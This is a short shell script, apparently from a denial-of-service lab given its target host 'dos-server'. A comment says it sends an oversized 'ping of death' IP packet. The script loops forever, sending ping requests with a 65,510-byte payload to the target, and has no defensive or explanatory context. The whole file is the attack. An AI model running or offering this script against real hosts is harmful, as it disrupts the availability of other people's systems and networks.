#!/bin/sh

# sending an IP packet larger than the 65,536 bytes allowed by the IP protocol

while true;
do
  ping -s 65510 dos-server
done